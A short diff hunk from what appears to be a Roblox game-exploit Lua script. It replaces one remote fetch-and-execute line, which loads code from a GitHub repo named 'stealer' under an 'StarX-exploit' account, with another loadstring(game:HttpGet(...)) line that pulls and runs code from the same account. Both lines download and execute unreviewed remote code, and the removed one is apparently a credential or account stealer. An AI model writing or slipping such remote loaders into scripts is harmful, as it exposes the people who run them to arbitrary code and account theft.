@@ -1077,4 +1077,4 @@ Deb:AddButton('Donate Me!', function()
     end
 end)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/StarX-exploit/stealer/refs/heads/main/best%20scripts"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/StarX-exploit/blade-ui/refs/heads/main/ui-star"))()
